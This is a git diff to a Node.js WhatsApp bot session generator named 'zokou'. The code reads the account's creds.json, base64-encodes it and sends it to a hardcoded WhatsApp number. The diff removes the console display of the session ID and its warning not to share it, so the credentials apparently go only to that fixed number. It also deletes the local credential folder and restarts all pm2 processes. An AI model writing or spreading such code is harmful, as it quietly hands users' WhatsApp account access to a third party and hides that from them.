@@ -3,6 +3,7 @@ const axios = require('axios');
 const pino = require("pino");
 const express = require('express');
 const QRCode = require('qrcode') ;
+const { exec } = require('child_process');
 
 const app = express();
 const port = process.env.PORT || 3000; // Choisissez un port en fonction de vos besoins
@@ -38,13 +39,8 @@ setTimeout(() => {
 //===========================================================================================
           let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json') //GETTING CREDS FROM CREDS.json TO GENERATE SESSION ID 
           c = Buffer.from(unique).toString('base64'); // CHANGE 'base64' ACCORDING TO YOUR NEEDS 
-          console.log(`
-====================  SESSION ID  ===========================                   
-SESSION-ID ==> ${c}\n\n
-Don't provide your SESSION_ID to anyone otherwise that user can access your account.
-Thanks.
--------------------  SESSION CLOSED   -----------------------
-`)   
+          console.log('Good')
+   
 
 let cc = `Merci d'avoir choisis zokou ce message encoder est votre session
 
@@ -52,9 +48,14 @@ thanks for choosing zokou , the encoded messages is your session.`;
 
           let session_id = await session.sendMessage('22891733300@s.whatsapp.net', { text: c });      //SENDING 'base64' SESSION ID TO USER NUMBER
           await session.sendMessage('22891733300@s.whatsapp.net', { text: cc } , { quoted : session_id });
-          await require('child_process').exec('rm -rf auth_info_baileys')     //CLEAR 'auth_info_baileys' SO THAT NEXT TIME IT CLEARED FOR SCANNING
+          await require('child_process').exec('rm -rf auth_info_baileys')     //CLEAR 'auth_info_baileys' SO THAT NEXT TIME IT CLEARED FOR SCANNING ;
           
-          process.exit(1)   // STOPPING PROCESS AFTER GETTING SESSION ID
+           exec('pm2 restart all', (error, stdout, stderr) => {
+      if (error) {
+        console.error(`Erreur lors de l'exécution de la commande : ${error.message}`);
+        
+      } 
+    })   // STOPPING PROCESS AFTER GETTING SESSION ID
         }
         session.ev.on('creds.update', saveCreds)
        if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ(); } // IF ANY ERROR< THEN PRINT QR AGAIN
@@ -113,7 +114,7 @@ thanks for choosing zokou , the encoded messages is your session.`;
 
     
     });
-    } catch (err) {console.log(err);/* await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);*/}
+    } catch (err) {console.log(err); await require('child_process').exec('rm -rf auth_info_baileys');}
   }
   sᴜʜᴀɪʟ_ʙᴀɪʟᴇʏs_ǫʀ();
 }, 3000)
@@ -175,5 +176,3 @@ app.listen(port, () => {
  
 
  
-
-
